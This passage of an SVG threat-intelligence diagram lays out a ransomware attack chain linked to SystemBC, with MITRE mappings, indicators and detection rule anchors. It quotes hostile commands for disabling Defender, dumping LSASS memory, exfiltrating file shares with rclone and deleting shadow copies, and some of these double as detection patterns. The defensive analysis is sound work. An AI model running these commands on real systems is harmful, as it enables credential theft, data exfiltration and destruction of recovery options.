    <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" class="arrow-fill"/>
    </marker>
  </defs>

  <text x="40" y="34" class="header">The Gentlemen RaaS + SystemBC</text>
  <text x="40" y="54" class="subhead">Check Point Research, April 2026 — RC4 SOCKS5 proxy + GPO weaponisation</text>

  <text x="40" y="90" class="lane">VICTIM ENTERPRISE (AD domain)</text>
  <text x="640" y="90" class="lane">ATTACKER C2 / SOCKS5 FABRIC</text>

  <rect x="40" y="100" width="500" height="78" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="122" r="13" class="stagebg"/>
  <text x="58" y="126" class="stagenum">1</text>
  <text x="84" y="120" class="label">Initial Access (unconfirmed — operator's pattern)</text>
  <text x="84" y="138" class="sub">Valid accounts via VPN, or FortiOS CVE-2024-55591 perimeter exploit</text>
  <text x="84" y="156" class="mitre">T1078, T1190</text>
  <text x="84" y="172" class="ioc">~14,700 FortiGate operational watchlist (operator)</text>

  <rect x="40" y="190" width="500" height="84" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="212" r="13" class="stagebg"/>
  <text x="58" y="216" class="stagenum">2</text>
  <text x="84" y="210" class="label">SystemBC drop + defence neutralisation</text>
  <text x="84" y="228" class="sub">update.exe in ProgramData, sc.exe stop WinDefend, BYOVD RTCore64.sys</text>
  <text x="84" y="246" class="mitre">T1059.001, T1562.001, T1562.002, T1562.004</text>
  <text x="84" y="262" class="ioc">C:\ProgramData\update.exe, %APPDATA%\Microsoft\winsrv.exe</text>

  <rect x="40" y="286" width="500" height="84" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="308" r="13" class="stagebg"/>
  <text x="58" y="312" class="stagenum">3</text>
  <text x="84" y="306" class="label">Persistence — scheduled task + GPO seeding</text>
  <text x="84" y="324" class="sub">schtasks MicrosoftEdgeUpdateTaskMachineCore + SYSVOL Scheduled Tasks XML</text>
  <text x="84" y="342" class="mitre">T1053.005, T1543.003, T1484.001</text>
  <text x="84" y="358" class="ioc">SYSVOL\&lt;dom&gt;\Policies\{GUID}\Machine\Preferences\ScheduledTasks\</text>

  <rect x="40" y="382" width="500" height="84" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="404" r="13" class="stagebg"/>
  <text x="58" y="408" class="stagenum">4</text>
  <text x="84" y="402" class="label">Credential Access — LSASS dump</text>
  <text x="84" y="420" class="sub">rundll32 comsvcs.dll MiniDump, nanodump (handle dup), DPAPI masterkeys</text>
  <text x="84" y="438" class="mitre">T1003.001</text>
  <text x="84" y="454" class="ioc">C:\ProgramData\dump.bin</text>

  <rect x="40" y="478" width="500" height="84" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="500" r="13" class="stagebg"/>
  <text x="58" y="504" class="stagenum">5</text>
  <text x="84" y="498" class="label">Discovery + Lateral Movement</text>
  <text x="84" y="516" class="sub">Advanced IP Scanner, AdFind, BloodHound; Impacket smbexec/wmiexec/psexec</text>
  <text x="84" y="534" class="mitre">T1046, T1482, T1021.001, T1021.002, T1021.006</text>
  <text x="84" y="550" class="ioc">all traffic routed via SystemBC SOCKS5 tunnel</text>

  <rect x="40" y="574" width="500" height="84" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="596" r="13" class="stagebg"/>
  <text x="58" y="600" class="stagenum">6</text>
  <text x="84" y="594" class="label">Command and Control — SystemBC SOCKS5/RC4</text>
  <text x="84" y="612" class="sub">100-byte handshake: 50B RC4 key + 50B RC4-encrypted init payload</text>
  <text x="84" y="630" class="mitre">T1090.002, T1573.001</text>
  <text x="84" y="646" class="ioc">plain TCP, no TLS — non-browser parent</text>

  <rect x="40" y="670" width="500" height="84" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="692" r="13" class="stagebg"/>
  <text x="58" y="696" class="stagenum">7</text>
  <text x="84" y="690" class="label">Exfiltration — rclone over the tunnel</text>
  <text x="84" y="708" class="sub">rclone copy \\fileserver\share remote:bucket --transfers=64</text>
  <text x="84" y="726" class="mitre">T1041</text>
  <text x="84" y="742" class="ioc">no separate egress — single SOCKS5 fabric</text>

  <rect x="40" y="766" width="500" height="98" rx="6" ry="6" class="bg-stage"/>
  <circle cx="62" cy="788" r="13" class="stagebg"/>
  <text x="58" y="792" class="stagenum">8</text>
  <text x="84" y="786" class="label">Impact — GPO-driven mass encryption</text>
  <text x="84" y="804" class="sub">--gpo flag rewrites gpttmpl.inf + ScheduledTasks.xml; Invoke-GPUpdate /Force</text>
  <text x="84" y="822" class="sub">X25519 + XChaCha20 AEAD; vssadmin delete shadows; bcdedit recoveryenabled No</text>
  <text x="84" y="840" class="mitre">T1486, T1490</text>
  <text x="84" y="858" class="ioc">near-simultaneous encryption across entire AD domain</text>

  <rect x="600" y="100" width="240" height="320" rx="6" ry="6" class="bg-c2"/>
  <text x="612" y="124" class="label">SystemBC C2 fabric</text>
  <text x="612" y="148" class="ioc">~10,340 IPs observed</text>
  <text x="612" y="164" class="ioc">AS213790 (Silent Push)</text>
  <text x="612" y="180" class="ioc">~1,570 victim hosts</text>
  <text x="612" y="196" class="ioc">~38-day median dwell</text>
  <text x="612" y="220" class="label">Protocol fingerprint</text>
  <text x="612" y="244" class="ioc">100-byte handshake</text>
  <text x="612" y="260" class="ioc">50B key + 50B init</text>
  <text x="612" y="276" class="ioc">RC4 stream + header</text>
  <text x="612" y="292" class="ioc">no TLS, no SNI</text>
  <text x="612" y="316" class="label">Commands</text>
  <text x="612" y="340" class="ioc">proxy_init</text>
  <text x="612" y="356" class="ioc">download_dll</text>
  <text x="612" y="372" class="ioc">download_exe</text>
  <text x="612" y="388" class="ioc">shellcode_exec</text>
  <text x="612" y="404" class="ioc">tor_pivot</text>

  <line x1="540" y1="616" x2="600" y2="260" class="arrow" marker-end="url(#arr)" marker-start="url(#arr)"/>

  <line x1="290" y1="178" x2="290" y2="190" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="274" x2="290" y2="286" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="370" x2="290" y2="382" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="466" x2="290" y2="478" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="562" x2="290" y2="574" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="658" x2="290" y2="670" class="arrow" marker-end="url(#arr)"/>
  <line x1="290" y1="754" x2="290" y2="766" class="arrow" marker-end="url(#arr)"/>

  <rect x="40" y="900" width="800" height="160" rx="6" ry="6" class="bg-det"/>
  <text x="56" y="924" class="det-title">Detection anchors (this folder's rule files)</text>
  <text x="56" y="948" class="det-line">• sigma/gpo_weaponization_systembc.yml — gPLink writes + SYSVOL Scheduled Tasks XML drops by a non-Tier-0 account</text>
  <text x="56" y="968" class="det-line">• kql/tcp_beacon_no_tls_systembc.kql — plain-TCP beacon, no TLS Client Hello, from a non-browser process</text>
  <text x="56" y="988" class="det-line">• yara/SystemBC_RC4_Heuristic.yar — SystemBC RC4-protocol heuristic for memory and disk artefacts</text>
  <text x="56" y="1008" class="det-line">• Watch for &quot;rundll32 comsvcs.dll, MiniDump&quot; on Windows Security 4688 / Sysmon 1</text>
  <text x="56" y="1028" class="det-line">• DC Security 5136 / 5137 GPO attribute changes outside documented GPO-admin windows</text>
  <text x="56" y="1048" class="det-line">• &quot;bcdedit /set recoveryenabled No&quot; and &quot;vssadmin delete shadows /all /quiet&quot; on Sysmon EID 1</text>

  <rect class="acc-other" x="0" y="0" width="880" height="8"/>
</svg>
